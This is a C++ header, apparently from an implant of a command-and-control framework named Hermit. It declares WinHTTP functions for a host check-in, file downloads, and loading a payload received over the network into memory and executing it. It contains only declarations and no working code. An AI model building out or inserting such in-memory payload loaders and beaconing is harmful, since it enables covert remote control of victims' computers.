#ifndef HERMIT_WINHTTP_HPP
#define HERMIT_WINHTTP_HPP

#include <windows.h>
#include <winhttp.h>
#include <shlwapi.h>
#include <string>
#include <strsafe.h>
#include <string>
#include <vector>
#include "common.hpp"
#include "convert.hpp"
#include "fs.hpp"
#include "macros.hpp"

VOID WinHttpCloseHandles(
	HINTERNET hSession,
	HINTERNET hConnect,
	HINTERNET hRequest
);
struct WinHttpHandlers {
	HINTERNET hSession;
	HINTERNET hConnect;
};
WinHttpHandlers InitRequest(LPCWSTR lpHost, INTERNET_PORT nPort);
struct WinHttpResponse {
	BOOL bResult;
	HINTERNET hRequest;
	DWORD dwStatusCode;
};
WinHttpResponse SendRequest(
	HINTERNET hConnect,
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpPath,
	LPCWSTR lpMethod,
	LPCWSTR lpHeaders,
	LPVOID lpData,
	DWORD dwDataLength
);
// It's used for reading small text from responses.
std::wstring ReadResponseText(HINTERNET hRequest);

// It's used for reading large data from responses.
// The data is saved at 'sFile'.
BOOL ReadResponseData(HINTERNET hRequest, const std::wstring& outFile);

// It's used for loading another payload into memory
// and execute it.
BOOL ReadResponsePayload(HINTERNET hRequest);

BOOL CheckIn(
	HINTERNET hConnect,
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpPath,
	const std::wstring& wInfoJson
);
BOOL DownloadFile(
	HINTERNET hConnect,
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpPath,
	const std::wstring& wSrc,
	const std::wstring& wDest
);

#endif // HERMIT_WINHTTP_HPP